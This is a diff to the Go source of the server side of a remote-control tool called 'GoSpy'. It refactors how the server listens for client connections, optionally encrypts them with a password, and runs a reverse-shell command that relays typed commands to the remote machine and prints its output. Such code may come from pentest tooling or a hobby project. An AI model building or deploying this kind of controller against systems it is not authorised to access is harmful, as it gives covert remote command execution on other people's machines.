@@ -11,14 +11,21 @@ import (
 
 // GoSpyClient represents a GoSpy client that is connected to this server.
 type GoSpyClient struct {
-	cm          comms.PacketManager // The manager for the connection to the client.
-	password    string              // The password for a secure connection.
-	bindAddress string              // The address to listen on for the inbound client connection.
+	listener    net.Listener            // The server for listening to for connections from the client.
+	cm          comms.ConnectionManager // The ConnectionManager for the main connection to the client.
+	passwordStr string                  // The password for a secure connection.
 }
 
 // NewGoSpyClient creates instantiates a GoSpyClient.
-func NewGoSpyClient(bindAddress string, password string) (client GoSpyClient) {
-	return GoSpyClient{bindAddress: bindAddress, password: password}
+// Binds the listener and waits for client connection before returning.
+func NewGoSpyClient(bindAddress, password string) (client GoSpyClient, err error) {
+	l, err := net.Listen("tcp", bindAddress)
+	if err != nil {
+		return GoSpyClient{}, err
+	}
+	c := GoSpyClient{listener: l, passwordStr: password}
+	c.WaitForClient()
+	return c, nil
 }
 
 // sendString sends a string to the client.
@@ -35,34 +42,33 @@ func (c GoSpyClient) recvString() (message string, err error) {
 	return string(data), nil
 }
 
-// CloseConn closes the conn.
-func (c GoSpyClient) CloseConn() (err error) {
-	return c.cm.Close()
+// WaitForClient calls WaitForConnection and then sets the returned ConnectionManager to the GoSpyClient's cm field.
+func (c *GoSpyClient) WaitForClient() {
+	c.cm = c.WaitForConnection()
 }
 
-// WaitForConn starts a tcp server and waits for a single successful connection.
-func (c *GoSpyClient) WaitForConn() (err error) {
-	l, err := net.Listen("tcp", c.bindAddress)
-	if err != nil {
-		return err
-	}
-	defer l.Close() // Closing the server won't close the already established client connection.
-
+// WaitForConnection waits for a successful connection to the listener and then sets up and returns a ConnectionManager.
+func (c GoSpyClient) WaitForConnection() comms.ConnectionManager {
 	for {
-		conn, err := l.Accept()
-		if err == nil {
-			if c.password != "" {
-				c.cm = comms.NewEncryptedConn(conn, c.password)
-			} else {
-				c.cm = comms.NewPlainConn(conn)
-			}
-			return nil
+		conn, err := c.listener.Accept()
+		if err != nil {
+			continue
+		}
+		if c.passwordStr != "" {
+			return comms.NewEncryptedConn(conn, c.passwordStr)
+		} else {
+			return comms.NewPlainConn(conn)
 		}
 	}
 }
 
-// Ping sends a "ping" to the client and waits for a "pong".
-func (c GoSpyClient) Ping() (response string, err error) {
+// Close closes the current connection manager.
+func (c GoSpyClient) Close() (err error) {
+	return c.cm.Close()
+}
+
+// CommandPing sends a "ping" to the client and waits for a "pong".
+func (c GoSpyClient) CommandPing() (response string, err error) {
 	err = c.sendString("ping")
 	if err != nil {
 		return "", err
@@ -70,37 +76,35 @@ func (c GoSpyClient) Ping() (response string, err error) {
 	return c.recvString()
 }
 
-// EnterReverseShellRepl initiates a REPL with the client.
-func (c GoSpyClient) EnterReverseShellRepl() (err error) {
+// CommandReverseShell initiates a new connection with the client and uses it for a reverse shell.
+func (c GoSpyClient) CommandReverseShell() (err error) {
 	err = c.sendString("reverse-shell")
 	if err != nil {
 		return err
 	}
 
-	fmt.Println("Type `exit` to leave shell")
+	cm := c.WaitForConnection()
+
+	fmt.Println("Type `exit` to leave the shell at any time")
+	_ = comms.BridgeCMToWriter(cm, os.Stdout)
 
 	for {
-		fmt.Print("\n$ ")
-
 		reader := bufio.NewReader(os.Stdin)
 		text, _ := reader.ReadString('\n')
-		text = strings.TrimSpace(text)
 
-		err := c.sendString(text)
+		textBytes := []byte(text)
+		err = cm.SendBytes(textBytes)
 		if err != nil {
-			return err
+			// Don't return the error because this is with the reverse shell connection, not with the original cm conn.
+			fmt.Printf("Reverse shell connection error: %s\n", err.Error())
+			break
 		}
 
-		// Exit after sending exit to client.
-		if text == "exit" {
-			return nil
+		if strings.TrimSpace(text) == "exit" {
+			break
 		}
-
-		resp, err := c.recvString()
-		if err != nil {
-			return err
-		}
-
-		fmt.Println(resp)
 	}
+
+	_ = cm.Close()
+	return nil
 }
